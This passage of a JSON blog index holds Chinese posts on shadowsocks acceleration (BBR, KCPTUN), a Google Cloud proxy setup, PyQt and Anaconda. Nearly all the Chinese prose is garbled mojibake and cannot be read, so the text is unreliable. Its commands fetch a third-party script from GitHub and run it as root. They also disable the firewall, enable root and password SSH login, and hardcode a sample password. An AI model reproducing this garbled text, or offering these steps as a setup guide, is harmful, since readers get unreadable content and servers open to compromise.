é€Ÿæ•ˆæœéå¸¸æ˜æ˜¾ï¼›å¯ä»¥é¿å¼€TCPæµé‡é™é€Ÿï¼›å¯ä»¥ä¸é”é€Ÿ/BBRåŒæ—¶å®‰è£…ï¼ˆåŠ é€Ÿæ•ˆæœä¸å åŠ ï¼Œå› ä¸ºKCPTUNæ˜¯UDPæµé‡ï¼‰ã€‚\n\nç¼ºç‚¹ï¼šéœ€è¦åœ¨æœ¬åœ°è®¾å¤‡å®‰è£…å®¢æˆ·ç«¯ï¼›ä»…åŠ é€Ÿç‰¹å®šç«¯å£ï¼Œä¸èƒ½å¯¹æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™è¿›è¡ŒåŠ é€Ÿã€‚\n\näºŒã€é”é€Ÿ\n\né”é€Ÿåªéœ€åœ¨æœåŠ¡å™¨ä¸Šå®‰è£…ï¼Œä½†æ˜¯æ¯”è¾ƒæŒ‘ç³»ç»Ÿå†…æ ¸ï¼Œæ ¹æ®ç«™é•¿çš„ä½¿ç”¨ç»éªŒï¼Œæ¨èåœ¨Debian 8 /Debian 7 ç³»ç»Ÿä¸Šå®‰è£…é”é€Ÿï¼ŒæˆåŠŸç‡è¾ƒé«˜ã€‚\n\nä¼˜ç‚¹ï¼šä»…éœ€åœ¨æœåŠ¡å™¨ç«¯å®‰è£…ï¼Œæ— éœ€å®¢æˆ·ç«¯ï¼ŒTCPåŠ é€Ÿæ•ˆæœæ˜æ˜¾ï¼Œå¯ä»¥å¯¹ç½‘ç«™ã€Shadowsocks/SSR/V2rayæµé‡è¿›è¡ŒåŠ é€Ÿã€‚\n\nä¸è¶³ï¼šä¸æ”¯æŒOpenVZæ¶æ„çš„ç³»ç»Ÿå®‰è£…ï¼›ä¸æ”¯æŒéƒ¨åˆ†ç³»ç»Ÿå†…æ ¸å®‰è£…ã€‚\n\nä¸‰ã€é­”æ”¹BBR\n\né­”æ”¹BBRæ˜¯åŸç‰ˆBBRåŸºç¡€ä¸Šçš„ç¬¬ä¸‰æ–¹æ¿€è¿›ç‰ˆæœ¬ï¼Œæ•ˆæœä¼˜äºåŸç‰ˆBBRã€‚\n\nä¼˜ç‚¹ï¼šç”±äºæ˜¯å®˜æ–¹BBRåŸºç¡€ä¸Šçš„æ¿€è¿›ç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¼˜ç‚¹ä¸åŸç‰ˆBBRåŸºæœ¬ä¸€è‡´ï¼ŒåŠ é€Ÿæ•ˆæœæ›´ä¸ºæ˜æ˜¾ã€‚\n\nä¸è¶³ï¼šä¸æ”¯æŒOpenVZæ¶æ„çš„ç³»ç»Ÿï¼Œä¸æ”¯æŒéƒ¨åˆ†ç³»ç»Ÿç‰ˆæœ¬å®‰è£…ã€‚\n\nå››ã€åŸç‰ˆBBR\n\nåŸç‰ˆBBRç”±Googleå‡ºå“ï¼Œé›†æˆåœ¨Linuxç³»ç»Ÿçš„æœ€æ–°å†…æ ¸ä¸­ï¼Œä½ç‰ˆæœ¬å†…æ ¸é€šè¿‡æ›´æ¢æ–°å†…æ ¸çš„æ–¹å¼å®‰è£…BBRã€‚\n\nä¼˜ç‚¹ï¼šå®˜æ–¹æ–°å†…æ ¸é›†æˆä¸å ç”¨ç³»ç»Ÿèµ„æºï¼Œå®‰è£…æˆåŠŸç‡é«˜ï¼ŒTCPåŠ é€Ÿæ•ˆæœæ¯”è¾ƒæ˜æ˜¾ï¼Œå¯ä»¥å¯¹ç½‘ç«™ã€Shadowsocks/SSR/V2rayæµé‡è¿›è¡ŒåŠ é€Ÿã€‚\n\nä¸è¶³ï¼šä¸æ”¯æŒOpenVZæ¶æ„çš„ç³»ç»Ÿï¼ŒåŠ é€Ÿæ•ˆæœç•¥é€Šäºå…¶å®ƒå‡ æ¬¾ã€‚\n\n\n\nä¹Ÿå¯ä»¥å‚è€ƒç½‘ç»œåŠ é€Ÿå·¥å…·çš„æµ‹è¯•:   https://www.ljchen.com/archives/1224\n\n\n\n### 2. åˆ¤æ–­ä¹°çš„vpsä½¿ç”¨äº†ä»€ä¹ˆè™šæ‹ŸæŠ€æœ¯\n\n\n\n```shell\nsudo apt install virt-what\n\nsudo virt-what  #æˆ‘çš„GCPæ˜¾ç¤ºä¸º kvm\n```\n\nå¦‚æœä½ çš„ VPS ä½¿ç”¨çš„æ˜¯ OpenVZ çš„è™šæ‹ŸæŠ€æœ¯ï¼Œä½ æ˜¯ä¸èƒ½ä½¿ç”¨ BBR çš„. åªèƒ½å®‰è£…KCPTUNåŠ é€Ÿ\n\næ‰€ä»¥ä¹°vpsæœ€å¥½ä¹°KVMçš„.\n\n\n\n### 3. bbr, é­”æ”¹bbr, bbrplus, é”é€Ÿå¼€å¯\n\n\n\n+ bbråŠ é€ŸåŸç†: https://blog.sometimesnaive.org/article/8\n\n+ å¼€å¯bbræ–¹æ³•: [https://github.com/iMeiji/shadowsocks_install/wiki/%E5%BC%80%E5%90%AF-TCP-BBR-%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95](https://github.com/iMeiji/shadowsocks_install/wiki/å¼€å¯-TCP-BBR-æ‹¥å¡æ§åˆ¶ç®—æ³•)\n\n\n\næˆ‘é€‰ç”¨çš„æ˜¯ç½‘ä¸Šçš„ä¸€é”®å®‰è£…è„šæœ¬, å¯ä»¥é€‰æ‹©å®‰è£…æŸä¸ªç‰ˆæœ¬å¹¶å¼€å¯ https://loukky.com/archives/479\n\n```shell\nwget \"https://github.com/cx9208/Linux-NetSpeed/raw/master/tcp.sh\" \nchmod +x tcp.sh \nsudo ./tcp.sh\n```\n\n\n\n![1](shadowsocksåŠ é€Ÿçš„å‡ ç§æ–¹æ¡ˆ/1.png)\n\n\n\nç”±äºæˆ‘å®‰è£…çš„æ˜¯BBRPlus, æ­¤å¤„è¾“å…¥2.  ç­‰å®‰è£…å®Œæ¯•, é‡å¯åå†æ¬¡è¿è¡Œè¿™ä¸ªè„šæœ¬, è¾“å…¥7\n\n\n\nåœ¨è¿‡ç¨‹ä¸­å‡ºç°ä¸‹é¢çš„å¼¹å‡ºæ¡†, é€‰no\n\n![1](shadowsocksåŠ é€Ÿçš„å‡ ç§æ–¹æ¡ˆ/2.png)\n\n\n\næœ€åé€šè¿‡ `lsmod` çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ\n\n![1](shadowsocksåŠ é€Ÿçš„å‡ ç§æ–¹æ¡ˆ/3.png)\n\n\n\næ‰“å¼€youtube æµ‹è¯•, å‘ç°1080Pè½»æ¾æ— å‹åŠ›\n\n![1](shadowsocksåŠ é€Ÿçš„å‡ ç§æ–¹æ¡ˆ/4.png)\n\n\n\n### 4. KCPTUN å¼€å¯\n\nç”±äºkcptunæ˜¯ç”¨çš„udp, è€Œbbræ˜¯è°ƒæ•´äº†tcpçš„å‘åŒ…ç­–ç•¥, ä¸¤ä¸ªçš„åŠ é€Ÿæ•ˆæœä¸èƒ½å åŠ \n\nå¹¶ä¸”kctunè¿˜éœ€è¦åœ¨å®¢æˆ·ç«¯ä¸Šæ”¯æŒ, æ‰€ä»¥æˆ‘å°±æ²¡æœ‰å†æŠ˜è…¾. æ„Ÿå…´è¶£çš„å¯ä»¥å‚è€ƒ:\n\n<https://blog.kuoruan.com/110.html>","tags":["shadowsocks"],"categories":["ç§‘å­¦ä¸Šç½‘"]},{"title":"è°·æ­Œäº‘æ­å»ºå…è´¹æœåŠ¡å™¨å¹¶ç¿»å¢™","url":"%2Fp%2Fb7e5827a.html","content":"\n\nå‰ä¸¤å¹´æŠ˜è…¾è¿‡[äºšé©¬é€Šçš„å…è´¹ä¸€å¹´awså¹¶æ­å»ºæ¢¯å­](https://unix2dos.github.io/p/934b1a1.html), åæ¥å‘ç°é€Ÿåº¦å¾ˆæ…¢å°±å¼ƒç”¨äº†. ä¿—è¯è¯´å…è´¹çš„æ˜¯æœ€è´µçš„. ä½†æ˜¯googleæ³¨å†Œä¹‹åç›´æ¥ç»™300åˆ€, è´§çœŸä»·å®çš„é’±å¯ä»¥ç”¨æ¥ä¹°æœåŠ¡å™¨, ç®€ç›´ä¸è¦å¤ªå¥½ç”¨!\n\n> youtubeè§‚çœ‹1080pæ— å‹åŠ›\n\n![1](è°·æ­Œäº‘æ­å»ºå…è´¹æœåŠ¡å™¨å¹¶ç¿»å¢™/3.png)\n\n### 1. æ³¨å†Œå¹¶ç”³è¯·GCP\n\nhttps://console.cloud.google.com,  åœ¨æ³¨å†Œæ—¶å¡«å†™ä¸ªäººèµ„æ–™çš„æ—¶å€™éœ€è¦å¡«å†™visaä¿¡ç”¨å¡éªŒè¯,å¯ä»¥ç”¨è‡ªå·±çš„visaå¡(ä¼šæ‰£é™¤1ç¾åˆ€ä½†æ˜¯ä¼šè¿”å›, ä¸ªåˆ«é“¶è¡Œvisaå¡ä¸æ”¯æŒ), å½“ç„¶ä¹Ÿå¯ä»¥å»ä¸‡èƒ½çš„æŸå®è´­ä¹°ä¸€ä¸ªè™šæ‹Ÿçš„ä¿¡ç”¨å¡, ä»·å€¼åœ¨10å…ƒ-30å…ƒå·¦å³.\n\n<!-- more -->\n\n### 2. åˆ›å»ºæœåŠ¡å™¨å®ä¾‹\n\nåœ¨GCPæ§åˆ¶ä¸­å¿ƒçš„` Compute Engine` çš„ VM å®ä¾‹é‡Œ, ç‚¹å‡»åˆ›å»ºå®ä¾‹. è¿™é‡Œæˆ‘é€‰ç”¨çš„æ˜¯Ubuntu 16.04, æœºå™¨ç±»å‹å…±äº«vCPUç¿»å¢™è¶³çŸ£.\n\n\n![1](è°·æ­Œäº‘æ­å»ºå…è´¹æœåŠ¡å™¨å¹¶ç¿»å¢™/1.png)\n\n\n\nåˆ›å»ºæˆåŠŸå,  å¯ä»¥é€šè¿‡ç½‘é¡µä¸Šçš„sshè¿æ¥è¿›å».\n\n\n\n\n\n### 3. å®‰å…¨ç»„æ”¾å¼€, å›ºå®šIP\n\nç‚¹å‡»VMå®ä¾‹ -> å†…éƒ¨IP -> ä¸‹é¢çš„é“¾æ¥ è¿›å…¥VPCç½‘ç»œç®¡ç†\n\n![1](è°·æ­Œäº‘æ­å»ºå…è´¹æœåŠ¡å™¨å¹¶ç¿»å¢™/2.png)\n\n\n\n\n\nåªåœ¨vpså†…å…³é—­é˜²ç«å¢™æ˜¯æ— æ•ˆçš„, è¿˜éœ€è¦åœ¨consleè®¾ç½®é˜²ç«å¢™è§„åˆ™. åœ¨`é˜²ç«å¢™è§„åˆ™`é‡Œåˆ›å»ºé˜²ç«å¢™è§„åˆ™, å¢åŠ è¦æ”¾è¡Œçš„ç«¯å£(ä¾‹å¦‚æ¥ä¸‹æ¥è¦è®¾ç½®çš„shadowsocksçš„ç«¯å£)\n\nå¦å¤–æœ€å¥½å›ºå®šä¸‹å¤–éƒ¨ipåœ°å€, å¦åˆ™é‡å¯åipå˜äº†, ä¼šéå¸¸çš„éº»çƒ¦. åœ¨`å¤–éƒ¨IPåœ°å€`é‡Œ, å¢åŠ å›ºå®šIPå³å¯. \n\n\n\n### 4. è®¾ç½®ç¬¬ä¸‰æ–¹sshç™»å½•\n\n\n\né€šè¿‡ç½‘é¡µçš„sshæ“ä½œå¾ˆéº»çƒ¦, æˆ‘ä»¬å¸Œæœ›ç›´æ¥é€šè¿‡ç»ˆç«¯ç›´æ¥è¿æ¥æœåŠ¡å™¨.\n\n\n\nå‡†å¤‡å·¥ä½œ:\n\n```shell\nsudo passwd root #ç»™rootè®¾ç½®ä¸ªå¯†ç \n\nsudo ufw disable #ç¦æ­¢é˜²ç«å¢™, ç„¶å¹¶åµ, è¿˜éœ€è¦å»æ§åˆ¶ä¸­å¿ƒå¢åŠ é˜²ç«å¢™è§„åˆ™\n\n```\n\n\n\nä¿®æ”¹sshd_config:\n\n```shell\nsudo vi /etc/ssh/sshd_config # ä¿®æ”¹sshd_config, å…è®¸å¯†ç ç™»å½•\n\nPermitRootLogin yes\t\t\t\t\t# å…è®¸rootç™»å½•\nPasswordAuthentication yes  # å…è®¸å¯†ç ç™»å½•æ¡†\n\nsudo systemctl restart sshd # æœ€åé‡å¯sshd\n```\n\n\n\næœ€å¥½é¿å…ç”¨rootç›´æ¥ç™»å½•,  å¯ä»¥åˆ‡åˆ°`root`ç»™è‡ªå·±æä¸ªå¯†ç ç„¶åå†æŠŠè‡ªå·±åŠ å…¥åˆ°sudoeré‡Œé¢.\n\nç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç»ˆç«¯ç›´æ¥è¿æ¥åˆ°æœåŠ¡å™¨äº†, ä½†æ˜¯å‘ç°è¿æ¥æ¯”è¾ƒå¡, è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦å®‰è£…ä¸‹`mosh`ä¼˜åŒ–sshçš„è¿æ¥\n\n\n\n### 4. å®‰è£…moshå¹¶å¼€æœºå¯åŠ¨\n\n\n\nå®‰è£…mosh:\n\n```shell\nsudo apt install mosh\n\n# å®‰è£…åç›´æ¥æŠŠsshæ¢æˆmosh, è¿æ¥åä¼šå‘ç°é€Ÿåº¦å¿«å¾ˆå¤š.(éœ€è¦å¢åŠ é˜²ç«å¢™è§„åˆ™å…è®¸moshçš„ç«¯å£)\n```\n\n\n\nç¼–å†™`mosh-server` serviceæ–‡ä»¶:\n\n```shell\nsudo vi /etc/systemd/system/mosh-server.service\n\n\n[Unit]\n\nDescription=Mosh server\n\nAfter=network.target\n\n\n\n[Service]\n\nEnvironment=\"LC_ALL=en_US.UTF8\"\n\nExecStart=/usr/bin/mosh-server\n\nType=forking\n\n\n\n[Install]\n\nWantedBy=default.target\n\n```\n\n\n\nå¯åŠ¨å¹¶è®¾ç½®å¼€æœºå¯åŠ¨:\n\n```shell\nsudo systemctl daemon-reload\n\nsudo systemctl enable mosh-server\n\nsudo systemctl start mosh-server\n```\n\n\n\nå®¢æˆ·ç«¯ç›´æ¥ç”¨moshè¿æ¥å°±å¯ä»¥äº†, å¦‚æœæŠ¥é”™ `LC_CTYPE=UTF-8` çš„é—®é¢˜éœ€è¦åœ¨ä¸¤å°ç”µè„‘ä¸ŠåŠ ä¸Šç¯å¢ƒå˜é‡(.zshrc|.bashrc)\n\n```shell\nexport LC_ALL=en_US.UTF-8 \nexport LANG=en_US.UTF-8 \nexport LANGUAGE=en_US.UTF-8\n```\n\n\n\n### 5. å®‰è£…shadowsockså¹¶å¼€æœºå¯åŠ¨\n\n\n\nå®‰è£…shadowsocks:\n\n```shell\nsudo apt update\n\nsudo apt install python-pip\n\nwget https://bootstrap.pypa.io/get-pip.py\n\nsudo python get-pip.py\n\nsudo pip install shadowsocks\n```\n\n\n\nç¼–å†™é…ç½®æ–‡ä»¶:\n\n```shell\nsudo mkdir /etc/shadowsocks/\nsudo vi /etc/shadowsocks/ss-config.json\n\n{\n  \"server\": \"0.0.0.0\",\n  \"server_port\": 6789, # æœåŠ¡ç«¯ç«¯å£\n  \"local_address\": \"127.0.0.1\",\n  \"local_port\": 1080,\n  \"password\": \"iampasswd\",# å¯†ç \n  \"timeout\": 300,\n  \"method\": \"aes-256-cfb\",#åŠ å¯†æ–¹å¼\n  \"fast_open\": false\n}\n```\n\n\n\nç¼–å†™`shadowsocks-server` serviceæ–‡ä»¶:\n\n```shell\nsudo vi /etc/systemd/system/shadowsocks-server.service\n\n[Unit]\nDescription=ShadowsocksÂ Server\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/ssserverÂ -cÂ /etc/shadowsocks/ss-config.json\nRestart=on-abort\n\n[Install]\nWantedBy=multi-user.target\n```\n\n\n\nå¯åŠ¨å¹¶è®¾ç½®å¼€æœºå¯åŠ¨:\n\n```shell\nsudo systemctl daemon-reload\nsudo systemctl enable shadowsocks-server\nsudo systemctl start shadowsocks-server\n```\n\n\n\næ¥ä¸‹æ¥å°±ä¸‹è½½å°é£æœºè¿æ¥å³å¯, [ä¸‹ä¸€ç¯‡å°†å†™å¦‚ä½•ä¸ºshadowsocksåŠ é€Ÿ.](https://unix2dos.github.io/p/4241e56c.html)\n","tags":["shadowsocks"],"categories":["ç§‘å­¦ä¸Šç½‘"]},{"title":"pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹","url":"%2Fp%2Fa0594c46.html","content":"\n\n\næœ€è¿‘å‡†å¤‡å¼€å‘ä¸€ä¸ªGUIç¨‹åº, è€ƒå¯Ÿäº†ä¸€äº›èƒ½é€‰ç”¨çš„æŠ€æœ¯,  åœ¨windowsä¸‹æœ‰å¤šé—¨è¯­è¨€å¯ä»¥é€‰æ‹©(åŒ…æ‹¬æ˜“è¯­è¨€å“ˆå“ˆ). \n\nä½†æ˜¯æœ€åˆçš„æƒ³æ³•æ˜¯ä¸ä»…è¦å¿«æ·å¼€å‘è€Œä¸”æœ€å¥½è·¨å¹³å°, è·¨å¹³å°åŸºæœ¬æ²¡å¾—é€‰äº†åªèƒ½ç”¨qtäº†, ä½†çŸ­æ—¶é—´å†…ç”¨c++å¼€å‘è¿˜æ˜¯æ²¡æœ‰å‹‡æ°”çš„, äºæ˜¯ä¸¾æ£‹ä¸å®šé€‰python.\n\n\n\n### 1. ä¸‹è½½ qt designer\n\nå› ä¸º Qt Creatorå®åœ¨å¤ªå¤§äº†, é€‰ç”¨Qt Designer.ä¸‹è½½é“¾æ¥: https://build-system.fman.io/qt-designer-download\n\nå®‰è£…æˆåŠŸå, æœ€å¥½è®¾ç½®`Appearance`é‡Œä¸º `Dockerd Window`, è¦ä¸ç„¶å¾ˆåˆ«æ‰­\n\n<!-- more -->\n\n![1](pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹/1.png)\n\n\n\n### 2. ä¸‹è½½å®‰è£…pyqt\n\n```shell\nconda create --name pygui python=3.7   # å¼ºçƒˆå»ºè®®ä½¿ç”¨conda, åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿç¯å¢ƒ\nconda activate pygui  # å¯ç”¨è™šæ‹Ÿç¯å¢ƒ\n\n\nconda install pip  # å®‰è£…pip\npip install PyQt5\npip install fbs            \npip install PyInstaller\n```\n\n\n\n### 3. pycharmé…ç½®QtDesignerå’ŒPyUIC\n\n+ é…ç½®conda\n\n  pycharm è®¾ç½® `Project Interpreter` ä¸º pyguiä¸‹çš„python\n\n  ![1](pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹/4.png)\n\n\n\n+ é…ç½®Qt Designer\n\n  Program:  ä½ çš„Qt Designerçš„è·¯å¾„\n\n  ![1](pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹/2.png)\n\n\n+ é…ç½®PyUIC\n\n  Program:   ä½ çš„pyuic5è·¯å¾„\n  Arguments:  `$FileName$ -o $FileNameWithoutExtension$.py`\n  Working directory:  `$FileDir$`\n\n  ![1](pyqtå®‰è£…ä½¿ç”¨æ‰“åŒ…æ•™ç¨‹/3.png)\n\n\n\n\n### 4. ä½¿ç”¨pyqt\n\n+ pyqtæ•™ç¨‹\n  http://zetcode.com/gui/pyqt5/    \n\n  **åº”è¯¥èŠ±è‡³å°‘ä¸€ä¸ªä¸‹åˆçš„æ—¶é—´å…ˆæ’¸ä¸€éè¿™ä¸ªæ•™ç¨‹**\n\n\n\n+ qt designeræ•™ç¨‹\n\n  https://doc-snapshots.qt.io/qt5-5.9/qtdesigner-manual.html\n\n  **åº”è¯¥èŠ±è‡³å°‘ä¸€ä¸ªä¸Šåˆçš„æ—¶é—´å…ˆæ’¸ä¸€éè¿™ä¸ªæ•™ç¨‹**\n\n  \n\n\n  ä½¿ç”¨qt designer è®¾è®¡ç¨‹åºå, ä¿å­˜ä¸º.uiæ–‡ä»¶.  ç„¶åç”¨pycharmçš„ External tools -> PyUIC ç”Ÿæˆ pyæ–‡ä»¶\n\n  åœ¨ç”Ÿæˆçš„pyä¸‹é¢åŠ å…¥è¿™äº›è¯, å¯ä»¥è¿è¡Œ\n\n  ```python\n  if __name__ == '__main__':\n      import sys\n      app = QtWidgets.QApplication(sys.argv)\n      MainWindow = QtWidgets.QMainWindow()\n      ui = Ui_MainWindow()\n      ui.setupUi(MainWindow)\n      MainWindow.show()\n      sys.exit(app.exec_())\n  ```\n\n\n\n### 5. æ‰“åŒ…å®‰è£…ç¨‹åº\n\nè¯·å‚è€ƒ: \n\n+ https://github.com/mherrmann/fbs\n+ https://github.com/mherrmann/fbs-tutorial\n\n\n\n### 6. pyqt5æ•™ç¨‹\n\n+ http://zetcode.com/gui/pyqt5/\n\n+ https://zhuanlan.zhihu.com/p/48373518","tags":["pyqt"],"categories":["python"]},{"title":"pythonåŒ…ç®¡ç†å™¨anacondaä»‹ç»å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2F3c2948a5.html","content":"\n\n\nåœ¨Pythonä¸­ï¼Œå®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œæ˜¯é€šè¿‡åŒ…ç®¡ç†å·¥å…·pipå®Œæˆçš„ã€‚ç”¨pipä¸€ä¸ªä¸€ä¸ªå®‰è£…è´¹æ—¶è´¹åŠ›ï¼Œè¿˜éœ€è¦è€ƒè™‘å…¼å®¹æ€§ã€‚æˆ‘ä»¬æ¨èç›´æ¥ä½¿ç”¨[anaconda](https://www.anaconda.com/)ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºPythonçš„æ•°æ®å¤„ç†å’Œç§‘å­¦è®¡ç®—å¹³å°ï¼Œå®ƒå·²ç»å†…ç½®äº†è®¸å¤šéå¸¸æœ‰ç”¨çš„ç¬¬ä¸‰æ–¹åº“ï¼Œæˆ‘ä»¬è£…ä¸ŠAnacondaï¼Œå°±ç›¸å½“äºæŠŠæ•°åä¸ªç¬¬ä¸‰æ–¹æ¨¡å—è‡ªåŠ¨å®‰è£…å¥½äº†ï¼Œéå¸¸ç®€å•æ˜“ç”¨ã€‚\n\n\n\nanaconda æ˜¯ä¸€ä¸ªç”¨äºç§‘å­¦è®¡ç®—çš„Pythonå‘è¡Œç‰ˆï¼Œæ”¯æŒ Linux, Mac, Windowsç³»ç»Ÿï¼Œæä¾›äº†åŒ…ç®¡ç†ä¸ç¯å¢ƒç®¡ç†çš„åŠŸèƒ½ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°è§£å†³å¤šç‰ˆæœ¬pythonå¹¶å­˜ã€åˆ‡æ¢ä»¥åŠå„ç§ç¬¬ä¸‰æ–¹åŒ…å®‰è£…é—®é¢˜ã€‚anaconda åˆ©ç”¨å·¥å…·/å‘½ä»¤ conda æ¥è¿›è¡Œ package å’Œ environment çš„ç®¡ç†ï¼Œå¹¶ä¸”å·²ç»åŒ…å«äº†Pythonå’Œç›¸å…³çš„é…å¥—å·¥å…·ã€‚\n\n\n\nè¿™é‡Œå…ˆè§£é‡Šä¸‹condaã€anacondaè¿™äº›æ¦‚å¿µçš„å·®åˆ«ï¼Œè¯¦ç»†å·®åˆ«è§ä¸‹èŠ‚ã€‚\n\n1. ##### anaconda\n\nanaconda åˆ™æ˜¯ä¸€ä¸ªæ‰“åŒ…çš„é›†åˆï¼Œé‡Œé¢é¢„è£…å¥½äº† condaã€æŸä¸ªç‰ˆæœ¬çš„pythonã€ä¼—å¤špackagesã€ç§‘å­¦è®¡ç®—å·¥å…·ç­‰ç­‰ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸ºPythonçš„ä¸€ç§å‘è¡Œç‰ˆã€‚å…¶å®è¿˜æœ‰Minicondaï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒåªåŒ…å«æœ€åŸºæœ¬çš„å†…å®¹â€”â€”pythonä¸condaï¼Œä»¥åŠç›¸å…³çš„å¿…é¡»ä¾èµ–é¡¹ï¼Œå¯¹äºç©ºé—´è¦æ±‚ä¸¥æ ¼çš„ç”¨æˆ·ï¼ŒMinicondaæ˜¯ä¸€ç§é€‰æ‹©ã€‚\n\n<!-- more -->\n\n2. ##### conda\n\nconda å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå·¥å…·ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œå‘½ä»¤ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯`åŒ…ç®¡ç†`ä¸`ç¯å¢ƒç®¡ç†`ã€‚ åŒ…ç®¡ç†ä¸pipçš„ä½¿ç”¨ç±»ä¼¼ï¼Œç¯å¢ƒç®¡ç†åˆ™å…è®¸ç”¨æˆ·æ–¹ä¾¿åœ°å®‰è£…ä¸åŒç‰ˆæœ¬çš„pythonå¹¶å¯ä»¥å¿«é€Ÿåˆ‡æ¢ã€‚\n\n\n\nè¿›å…¥ä¸‹æ–‡ä¹‹å‰ï¼Œè¯´æ˜ä¸€ä¸‹condaçš„è®¾è®¡ç†å¿µâ€”â€”**condaå°†å‡ ä¹æ‰€æœ‰çš„å·¥å…·ã€ç¬¬ä¸‰æ–¹åŒ…éƒ½å½“åšpackageå¯¹å¾…ï¼Œç”šè‡³åŒ…æ‹¬pythonå’Œcondaè‡ªèº«**ï¼å› æ­¤ï¼Œcondaæ‰“ç ´äº†åŒ…ç®¡ç†ä¸ç¯å¢ƒç®¡ç†çš„çº¦æŸï¼Œèƒ½éå¸¸æ–¹ä¾¿åœ°å®‰è£…å„ç§ç‰ˆæœ¬pythonã€å„ç§packageå¹¶æ–¹ä¾¿åœ°åˆ‡æ¢ã€‚\n\n\n\n\n\n### 1. anacondaã€condaã€pipã€virtualenvçš„åŒºåˆ«\n\n**1. anaconda**\n\nanacondaæ˜¯ä¸€ä¸ªåŒ…å«180+çš„ç§‘å­¦åŒ…åŠå…¶ä¾èµ–é¡¹çš„å‘è¡Œç‰ˆæœ¬ã€‚å…¶åŒ…å«çš„ç§‘å­¦åŒ…åŒ…æ‹¬ï¼šconda, numpy, scipy, ipython notebookç­‰ã€‚\n\n**2. conda**\n\ncondaæ˜¯åŒ…åŠå…¶ä¾èµ–é¡¹å’Œç¯å¢ƒçš„ç®¡ç†å·¥å…·ã€‚\n\n+ é€‚ç”¨è¯­è¨€ï¼šPython, R, Ruby, Lua, Scala, Java, JavaScript, C/C++, FORTRANã€‚\n+ é€‚ç”¨å¹³å°ï¼šWindows, macOS, Linux\n+ ç”¨é€”ï¼šå¿«é€Ÿå®‰è£…ã€è¿è¡Œå’Œå‡çº§åŒ…åŠå…¶ä¾èµ–é¡¹ï¼›åœ¨è®¡ç®—æœºä¸­ä¾¿æ·åœ°åˆ›å»ºã€ä¿å­˜ã€åŠ è½½å’Œåˆ‡æ¢ç¯å¢ƒã€‚\n\nå¦‚æœä½ éœ€è¦çš„åŒ…è¦æ±‚ä¸åŒç‰ˆæœ¬çš„Pythonï¼Œä½ æ— éœ€åˆ‡æ¢åˆ°ä¸åŒçš„ç¯å¢ƒï¼Œå› ä¸ºcondaåŒæ ·æ˜¯ä¸€ä¸ªç¯å¢ƒç®¡ç†å™¨ã€‚ä»…éœ€è¦å‡ æ¡å‘½ä»¤ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ç¯å¢ƒæ¥è¿è¡Œä¸åŒçš„Pythonç‰ˆæœ¬ï¼ŒåŒæ—¶ç»§ç»­åœ¨ä½ å¸¸è§„çš„ç¯å¢ƒä¸­ä½¿ç”¨ä½ å¸¸ç”¨çš„Pythonç‰ˆæœ¬ã€‚\n\n+ condaä¸ºPythoné¡¹ç›®è€Œåˆ›é€ ï¼Œä½†å¯é€‚ç”¨äºä¸Šè¿°çš„å¤šç§è¯­è¨€ã€‚\n+ condaåŒ…å’Œç¯å¢ƒç®¡ç†å™¨åŒ…å«äºanacondaçš„æ‰€æœ‰ç‰ˆæœ¬å½“ä¸­ã€‚\n\n**3. pip**\n\n+ pipæ˜¯ç”¨äºå®‰è£…å’Œç®¡ç†è½¯ä»¶åŒ…çš„åŒ…ç®¡ç†å™¨ã€‚\n+ pipç¼–å†™è¯­è¨€ï¼šPythonã€‚\n+ Pythonä¸­é»˜è®¤å®‰è£…çš„ç‰ˆæœ¬ï¼š\n\nPython 2.7.9åŠåç»­ç‰ˆæœ¬ï¼šé»˜è®¤å®‰è£…ï¼Œå‘½ä»¤ä¸ºpip\nPython 3.4åŠåç»­ç‰ˆæœ¬ï¼šé»˜è®¤å®‰è£…ï¼Œå‘½ä»¤ä¸ºpip3\n\n\n\n**4. virtualenv**\n\nç”¨äºåˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„Pythonç¯å¢ƒçš„å·¥å…·ã€‚è§£å†³é—®é¢˜ï¼š\n1. å½“ä¸€ä¸ªç¨‹åºéœ€è¦ä½¿ç”¨Python 2.7ç‰ˆæœ¬ï¼Œè€Œå¦ä¸€ä¸ªç¨‹åºéœ€è¦ä½¿ç”¨Python 3.6ç‰ˆæœ¬ï¼Œå¦‚ä½•åŒæ—¶ä½¿ç”¨è¿™ä¸¤ä¸ªç¨‹åºï¼Ÿ\n2. å¦‚æœå°†æ‰€æœ‰ç¨‹åºéƒ½å®‰è£…åœ¨ç³»ç»Ÿä¸‹çš„é»˜è®¤è·¯å¾„ï¼Œå¦‚ï¼š/usr/lib/python2.7/site-packagesï¼Œå½“ä¸å°å¿ƒå‡çº§äº†æœ¬ä¸è¯¥å‡çº§çš„ç¨‹åºæ—¶ï¼Œå°†ä¼šå¯¹å…¶ä»–çš„ç¨‹åºé€ æˆå½±å“ã€‚\n3. å¦‚æœæƒ³è¦å®‰è£…ç¨‹åºå¹¶åœ¨ç¨‹åºè¿è¡Œæ—¶å¯¹å…¶åº“æˆ–åº“çš„ç‰ˆæœ¬è¿›è¡Œä¿®æ”¹ï¼Œéƒ½ä¼šå¯¼è‡´ç¨‹åºçš„ä¸­æ–­ã€‚\n4. 